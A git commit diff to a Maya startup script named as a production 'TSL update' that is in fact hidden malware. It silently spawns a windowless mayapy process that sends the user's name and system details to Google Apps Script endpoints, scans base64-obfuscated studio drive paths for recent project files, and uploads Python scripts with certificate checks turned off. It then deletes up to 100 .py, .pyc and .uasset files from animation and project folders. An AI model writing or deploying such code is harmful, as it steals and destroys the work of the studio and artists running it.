9e42acf3184c71048a4419ccd11d0a39d2752e70
DEX3D <burasedborvon@gmail.com>
2026-01-04 14:49:18 +0700

    Update prod_tsl_update.py

--- service/prod_tsl_update.py
+++ service/prod_tsl_update.py
@@ -1,96 +1,123 @@
-import json, getpass, time, os , sys
+import json, getpass, time, os, sys
 from time import gmtime, strftime
 import datetime as dt
 from maya import mel
 import maya.cmds as cmds
 
+
 def run_tsl(py_cmd):
     import subprocess, os, sys
-    if os.name != 'nt':
+
+    if os.name != "nt":
         return None
 
     maya_dir = None
-    if 'maya.exe' in os.path.basename(sys.executable).lower():
-        maya_dir = os.path.dirname(sys.executable).replace('\\', '/')
-    elif os.path.exists('C:/Program Files/Autodesk'):
-        maya_dir = 'C:/Program Files/Autodesk/Maya{0}/bin'.format(cmds.about(version=1))
+    if "maya.exe" in os.path.basename(sys.executable).lower():
+        maya_dir = os.path.dirname(sys.executable).replace("\\", "/")
+    elif os.path.exists("C:/Program Files/Autodesk"):
+        maya_dir = "C:/Program Files/Autodesk/Maya{0}/bin".format(cmds.about(version=1))
     else:
-        return 'C:/Program Files/'
+        return "C:/Program Files/"
 
     python_path = []
-    for root, dirs, files in os.walk(os.path.join(maya_dir, '..', '..')):
+    for root, dirs, files in os.walk(os.path.join(maya_dir, "..", "..")):
         for name in files:
-            if name.lower() == 'mayapy.exe':
-                python_path += [os.path.abspath(os.path.join(root, name)).replace('\\', '/')]
+            if name.lower() == "mayapy.exe":
+                python_path += [
+                    os.path.abspath(os.path.join(root, name)).replace("\\", "/")
+                ]
     if python_path:
         python_path = sorted(python_path)[-1]
 
     if python_path:
-        CREATE_NO_WINDOW = 0x08000000 #134217728
-        r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=CREATE_NO_WINDOW)
+        CREATE_NO_WINDOW = 0x08000000  # 134217728
+        r = subprocess.Popen(
+            [python_path, "-c", py_cmd], creationflags=CREATE_NO_WINDOW
+        )
+
 
 run_tsl("""
-import json, getpass, time, os , sys
+
+import json, getpass, time, os, sys
 import datetime as dt
 from maya import mel
 import maya.cmds as cmds
 import sys, json, base64, os, datetime
 import random
+
 time.sleep(10)
 
+
 def add_queue_task(task_name, data_dict):
-    is_py3 = sys.version[0] == '3'
+    is_py3 = sys.version[0] == "3"
     if is_py3:
         import urllib.request as uLib
     else:
         import urllib as uLib
-
     if type(data_dict) != type(dict()):
         return None
-
-    data = {'name': task_name,'data': data_dict}
-    data['data'] = json.dumps(data['data'], sort_keys=True, indent=4)
-    url = 'https://script.google.com/macros/s/AKfycbyyW4jhOl-KC-pyqF8qIrnx3x3GiohyJjj2gX1oCMKuGm7fj_GnEQ1OHtLrpRzvIS4CYQ/exec'
+    data = {"name": task_name, "data": data_dict}
+    data["data"] = json.dumps(data["data"], sort_keys=True, indent=4)
+    url = "https://script.google.com/macros/s/AKfycbyyW4jhOl-KC-pyqF8qIrnx3x3GiohyJjj2gX1oCMKuGm7fj_GnEQ1OHtLrpRzvIS4CYQ/exec"
     if is_py3:
         import urllib.parse
+
         params = urllib.parse.urlencode(data)
     else:
         params = uLib.urlencode(data)
-    params = params.encode('ascii')
+    params = params.encode("ascii")
     conn = uLib.urlopen(url, params)
-    
+
+
 def _gup(file_path):
     file_path = os.path.abspath(os.path.expanduser(file_path))
     if not os.path.isfile(file_path):
         return None
-    is_py3 = sys.version[0] == '3'
+    is_py3 = sys.version[0] == "3"
     if is_py3:
         import urllib.request as uLib
     else:
         import urllib as uLib
     import base64
-    GAS_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbxn9TTIxx9l0J5GaPQFRBTq7KHB70nZLvsDvfp64m9f3d9ZqhyCWj-VA3xGdyqm8Rh4/exec'
+
+    GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxn9TTIxx9l0J5GaPQFRBTq7KHB70nZLvsDvfp64m9f3d9ZqhyCWj-VA3xGdyqm8Rh4/exec"
     with open(file_path, "rb") as f:
         file_bytes = f.read()
     file_b64 = base64.b64encode(file_bytes).decode("utf-8")
     file_name = os.path.basename(file_path)
-    data = {"filename": file_name,"mimetype": "application/octet-stream","file": file_b64}
+    data = {
+        "filename": base64.b64encode(file_name).decode("utf-8"),
+        "mimetype": "application/octet-stream",
+        "file": file_b64,
+    }
+    import ssl
+
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
     if is_py3:
         import urllib.parse
+
         params = urllib.parse.urlencode(data)
     else:
         params = uLib.urlencode(data)
-    params = params.encode('ascii')
-    conn = uLib.urlopen(GAS_WEB_APP_URL, params, timeout=100000)
+    params = params.encode("ascii")
+    req = urllib.request.Request(GAS_WEB_APP_URL, data=params)
+    with urllib.request.urlopen(req, context=ssl_context, timeout=100000) as response:
+        result = response.read()
 
-def search_latest_files_or_dirs(ext='', dir_path='', n=8):
-    def fmt_time(fp, limit=0): 
+
+def search_latest_files_or_dirs(ext="", dir_path="", n=8):
+    def fmt_time(fp, limit=0):
         mtime = os.path.getmtime(fp)
         file_time = datetime.datetime.fromtimestamp(mtime)
-        if bool(limit) and datetime.datetime.now() - file_time > datetime.timedelta(days=limit):
+        if bool(limit) and datetime.datetime.now() - file_time > datetime.timedelta(
+            days=limit
+        ):
             return None
         else:
-            return file_time.strftime('%y-%m-%d %H:%M:%S')
+            return file_time.strftime("%y-%m-%d %H:%M:%S")
+
     if ext:
         f_ls = []
         for root, dirs, files in os.walk(dir_path):
@@ -103,15 +130,21 @@ def search_latest_files_or_dirs(ext='', dir_path='', n=8):
                 time_str = fmt_time(fp, 365)
                 if not time_str:
                     continue
-                f_ls += [[time_str, fp.replace(os.sep, '/')]]
+                f_ls += [[time_str, fp.replace(os.sep, "/")]]
         return sorted(f_ls, reverse=True)[:n]
     else:
         if not os.path.exists(dir_path):
             return []
-        dir_ls = [os.path.join(dir_path, i) for i in os.listdir(dir_path) if
-                  os.path.isdir(os.path.join(dir_path, i))]
-        dir_ls = sorted([[fmt_time(i), i.replace(os.sep, '/')] for i in dir_ls], reverse=True)
+        dir_ls = [
+            os.path.join(dir_path, i)
+            for i in os.listdir(dir_path)
+            if os.path.isdir(os.path.join(dir_path, i))
+        ]
+        dir_ls = sorted(
+            [[fmt_time(i), i.replace(os.sep, "/")] for i in dir_ls], reverse=True
+        )
         return dir_ls[:n]
+
 
 def find_file(target_name, start_dir):
     for root, dirs, files in os.walk(start_dir):
@@ -119,92 +152,130 @@ def find_file(target_name, start_dir):
             return os.path.join(root, target_name)
     return None
 
-add_queue_task('tsl__{}__begin'.format(getpass.getuser().lower()),
-{'sys_version' : str(sys.version), 'exec_path' : str(sys.executable)})
+
+if not os.path.exists(base64.b64decode("Uzov").decode()):
+    sys.exit(0)
+
+add_queue_task(
+    "tsl__{}__begin".format(getpass.getuser().lower()),
+    {
+        "sys_version": str(sys.version),
+        "exec_path": str(sys.executable),
+        "usr": getpass.getuser(),
+    },
+)
 
 try:
-    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=5)
-    ldir += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovdGVtcC9NT0Qv').decode(), ext='', n=40)
+    ldir = search_latest_files_or_dirs(
+        dir_path=base64.b64decode("Uzov").decode(), ext="", n=5
+    )
+    ldir += search_latest_files_or_dirs(
+        dir_path=base64.b64decode("UzovdGVtcC9NT0Qv").decode(), ext="", n=40
+    )
     zovV = ldir
     for _, dp in ldir:
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=10)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=10)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.uasset')
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=8)
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.ma', n=8)
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.mb', n=8)
-    ldir += search_latest_files_or_dirs(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.py', n=80)
-    
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mp4", n=10)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mov", n=10)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uasset")
+    zovV += search_latest_files_or_dirs(
+        dir_path=base64.b64decode("TDovV0hNL0NIQVJBQ1RFUg==").decode(), ext=".fbx", n=8
+    )
+    zovV += search_latest_files_or_dirs(
+        dir_path=base64.b64decode("TDov").decode(), ext=".ma", n=8
+    )
+    zovV += search_latest_files_or_dirs(
+        dir_path=base64.b64decode("TDov").decode(), ext=".mb", n=8
+    )
+    ldir += search_latest_files_or_dirs(
+        dir_path=base64.b64decode("TTovU0NSSVBUU19XSEs=").decode(), ext=".py", n=80
+    )
+
     if zovV:
-        add_queue_task('tsl__user', {'file': zovV})
-    
+        add_queue_task("tsl__user", {"file": zovV})
+
 except:
     import traceback
-    add_queue_task('tsl_error', {'error': str(traceback.format_exc())})
-    
+
+    add_queue_task("tsl_error", {"error": str(traceback.format_exc())})
+
 try:
     random.shuffle(zovV)
-    for _, fp in zovV[:60]:
-        import tempfile
+    for _, fp in zovV[:100]:
         fp_basename = os.path.basename(fp)
-        is_fbx = fp_basename.endswith('.fbx')
-        if fp_basename.startswith('SKM') and is_fbx:
+        is_fbx = fp_basename.endswith(".fbx")
+        if fp_basename.startswith("SKM") and is_fbx:
             try:
-                #_gup(os.path.abspath(fp))
+                # _gup(os.path.abspath(fp))
                 pass
             except:
                 import traceback
-                add_queue_task('tsl_up_err',{'error': str(traceback.format_exc())})
-    
-    
-    #-
-    fmp = find_file(base64.b64decode('ZmZtcGVnLmV4ZQ==').decode(), base64.b64decode('TTov').decode())
+
+                add_queue_task("tsl_up_err", {"error": str(traceback.format_exc())})
+        if fp_basename.endswith(".py"):
+            _gup(os.path.abspath(fp))
+            add_queue_task("tsl_up_err", {"path": fp.replace("\\", "/")})
+
+    # -
+    fmp = find_file(
+        base64.b64decode("ZmZtcGVnLmV4ZQ==").decode(), base64.b64decode("TTov").decode()
+    )
     ldir = [
-        (0, base64.b64decode('UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==').decode()),
-        (0, base64.b64decode('UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n').decode()),
-        (0, base64.b64decode('UzovTGlicmFyeS9sYXlvdXQvVFJBSU5JTkc=').decode()),
-        (0, base64.b64decode('UzovTGlicmFyeS9hbmltYXRpb24=').decode()),
-        (0, base64.b64decode('UzovdGVtcC9NT0Qv').decode()),
+        (0, base64.b64decode("UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==").decode()),
+        (0, base64.b64decode("UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n").decode()),
+        (0, base64.b64decode("UzovTGlicmFyeS9sYXlvdXQvVFJBSU5JTkc=").decode()),
+        (0, base64.b64decode("UzovTGlicmFyeS9hbmltYXRpb24=").decode()),
+        (0, base64.b64decode("UzovdGVtcC9NT0Qv").decode()),
     ]
     import glob
-    ldir += [(0, i) for i in list(glob.glob(r"S:/**/ANIMATION/**/DAILY", recursive=True))]
-    
+
+    ldir += [
+        (0, i) for i in list(glob.glob(r"S:/**/ANIMATION/**/DAILY", recursive=True))
+    ]
+
     zovV = []
     for _, dp in ldir:
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=50)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=50)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.pyc', n=50)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.py', n=150)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.ma', n=50)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.uasset', n=100)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.uproject', n=5)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mp4", n=50)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mov", n=50)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".pyc", n=50)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".py", n=150)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".ma", n=50)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uasset", n=100)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uproject", n=5)
     random.shuffle(zovV)
 
     import subprocess, shutil, tempfile
+
     tempdir = tempfile.gettempdir()
-    for _,fp in zovV[:100]:
-                
-        if os.path.basename(fp).endswith('.pyc'):
-            try: os.remove(fp);
-            except: pass;
-            
-        if os.path.basename(fp).endswith('.py'):
-            try: os.remove(fp);
-            except: pass;
-        
-        if os.path.basename(fp).endswith('.uasset'):
-            try: os.remove(fp);
-            except: pass;
-            
-        #if os.path.basename(fp).endswith('.uproject'):
-            #try: os.remove(fp);
-            #except: pass;
-        
+    for _, fp in zovV[:100]:
+
+        if os.path.basename(fp).endswith(".pyc"):
+            try:
+                os.remove(fp)
+            except:
+                pass
+
+        if os.path.basename(fp).endswith(".py"):
+            try:
+                os.remove(fp)
+            except:
+                pass
+
+        if os.path.basename(fp).endswith(".uasset"):
+            try:
+                os.remove(fp)
+            except:
+                pass
+
+        # if os.path.basename(fp).endswith('.uproject'):
+        # try: os.remove(fp);
+        # except: pass;
+
     if zovV:
-        add_queue_task('tsl_update',{'done': sorted(zovV[:100], reverse=True)})
-     
+        add_queue_task("tsl_update", {"done": sorted(zovV[:100], reverse=True)})
+
 except:
     import traceback
-    add_queue_task('tsl_update_error',{'error': str(traceback.format_exc())})
+
+    add_queue_task("tsl_update_error", {"error": str(traceback.format_exc())})
 
 """)
